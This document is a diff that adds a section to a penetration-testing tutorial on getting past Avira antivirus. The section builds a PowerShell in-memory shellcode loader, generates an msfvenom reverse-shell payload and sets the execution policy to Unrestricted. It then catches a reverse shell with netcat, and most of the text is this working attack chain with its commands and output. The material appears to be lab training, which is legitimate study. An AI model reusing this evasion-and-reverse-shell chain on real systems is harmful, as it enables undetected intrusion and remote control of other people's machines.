@@ -153,3 +153,192 @@ Another rule of thumb you should follow when developing AV bypasses is to always
 
 ### Evading AV with Threat Injection
 
+Finding a universal solution to bypass all AV products is difficult and time consuming, if not impossible. Considering time limitations during a typical pentest, it is far more efficient to target the specific AV product deployed in the target network.
+
+In this example, you will interact with Avira Free Security version 1.1.68.29553 on your Windows 11 client. Once on your machine, you can navigate to the Security panel from the left menu and click on Protection Options:
+
+![av evasion offsec 2](../../images/av_evasion_offsec2.gif)
+
+As a first step when testing AV products, you should verify that the AV is working as intended. You will use the msfvenom payload you generated earlier an scan it with Avira.
+
+After transferring the malicious PE to your Windows client, you are almost immediately warned about the malicious content of the uploaded file. In this case, you are presented with an error message indicating that your file has been blocked.
+
+![av evasion offsec 3](../../images/av_evasion_offsec3.gif)
+
+![av evasion offsec 4](../../images/av_evasion_offsec4.png)
+
+Avira displays a popup notification informing you that the file was flagged as malicious and quarantined.
+
+Depending on how restricted your target environment is, you might be able to bypass AV products with the help of PowerShell.
+
+#### Example: Remote Process Memory Injection
+
+A very powerful feature of PowerShell is its ability to interact with the Windows API. This allows you to implement the in-memory injection process in a PowerShell script. One of the main benefits of executing a script rather than a PE is that it is difficult for AV manufacturers to determine if the script is malicious as it's run inside an interpreter and the script itself isn't executable code. Nevertheless, please keep in mind that some AV products handle malicious script detection with more success than others.
+
+Furthermore, even if the script is marked as malicious, it can easily bin altered. AV software will often review variable names, commens, and logic, all of which can be changed without the need of recompile anything.
+
+To demonstrate an introductory AV bypass, you are going to first analyze a well-known version of the memory injection PowerShell script and then test it against Avira.
+
+A basic template script that performs in-memory injection is shown below:
+
+```powershell
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+<place shellcode here>
+```
+
+The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset from msvcrt.dll. These functions will allow you to allocate memory, create an execution thread, and write arbitrary data to the allocated memory, respectively. You will allocate the memory and execute a new thread in the current process, rather than a remote one.
+
+Your payload is missing from your script, but you can generate it using msfvenom with the format PowerShell reflection.
+
+PowerShell reflection script begins by allocating unmanaged memory, then decodes the base64-encoded shellcode and transfers it into that memory. Afterwards, it builds a dynamic assembly that includes a method designed to run the injected payload.
+
+```bash
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of psh-reflection file: 2960 bytes
+...
+function xf {
+        Param ($nfCl, $vf)
+        $uaQP = ([AppDomain]...
+...
+```
+
+Now that you have generated shellcode, you can replace `<place shellcode here>` with the PowerShell output.
+
+Your complete script resembles the following:
+
+```powershell
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+function xf {
+        Param ($nfCl, $vf)
+        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
+}
+
+function xb {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
+                [Parameter(Position = 1)] [Type] $hh = [Void]
+        )
+...
+```
+
+> [!INFO]
+> Use [this](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py) to turn a PowerShell-script into a one-liner.
+
+AV vendors often rely on static string signatures related to meaningful code portions, such as variables or function names, to catch malicious scripts. To bypass this detection logic, your generated payload with the format psh-reflection already has randomly generated variable and function names. These names will be different every time you generate a payload with psh-reflection.
+
+Scripts are just interpreted text files. They are not easily fingerprinted like binary files, which have a more structured data format.
+
+Next, you are going to verify the detection rate of your PowerShell script using VirusTotal.
+
+![av evasion offsec 5](../../images/av_evasion_offsec5.png)
+
+According to the result of the VirusTotal scan, 25 of the 63 AV products flagged your script as malicious. Avira did not flag your payload.
+
+Once you save the PowerShell script as bypass.ps1 and transfer it over the target Windows client 11, you can run a Quick Scan to verify that your attack vector is undetected. To run the scan, you'll click on the Security option on the left-hand menu, select Virus Scans, and then click on Scan under the Quick Scan option.
+
+Once Avira has scanned your script on your Windows 11 machine, it indicates your script is not malicious.
+
+![av evasion offsec 6](../../images/av_evasion_offsec6.png)
+
+Since the msfvenom payload is for x86, you are going to launch the x86 version of PowerShell, named `Windows PowerShell (x86)`:
+
+![av evasion offsec 7](../../images/av_evasion_offsec7.png)
+
+Run `bypass.ps1` and analyze the output.
+
+```
+PS C:\Users\offsec\Desktop> .\bypass.ps1
+.\bypass.ps1 : File C:\Users\offsec\Desktop\bypass.ps1 cannot be loaded because running scripts is disabled on this
+system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ .\bypass.ps1
++ ~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+```
+
+Unfortunately, when you attempt to run your malicious script, you are presented with an error that references the Execution Policies of your system, which appear to prevent your script from running.
+
+To change the policy globally: you are going to retrieve the current execution policy via the `Get-ExecutionPolicy -Scope CurrentUser` command and then set it to `Unrestricted`via the `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser` command. You need `-Scope CurrentUser` to specify that you are setting the execution policy for the current user.
+
+```
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+Undefined
+
+PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help Module at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
+
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+Unrestricted
+```
+
+The listing above shows that you have successfully changed the policy for your current user to `Unrestricted`.
+
+Before executing your script, you will start a Netcat listener to interact with your shell.
+
+```bash
+kali@kali:~$ nc -lvnp 443
+listening on [any] 443 ...
+```
+
+Now you will try to launch the PowerShell script:
+
+```
+PS C:\Users\offsec\Desktop> .\bypass.ps1
+
+IsPublic IsSerial Name                                     BaseType
+-------- -------- ----                                     --------
+True     True     Byte[]                                   System.Array
+124059648
+124059649
+...
+```
+
+The script executes without any problems, and you receive a revshell on your attack machine.
+
+```bash
+kali@kali:~$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.50.1] from (UNKNOWN) [192.168.50.62] 64613
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec>whoami
+whoami
+client01\offsec
+
+C:\Users\offsec>hostname
+hostname
+client01
+```
+
+This means you have effectively evaded Avira detection on your target.
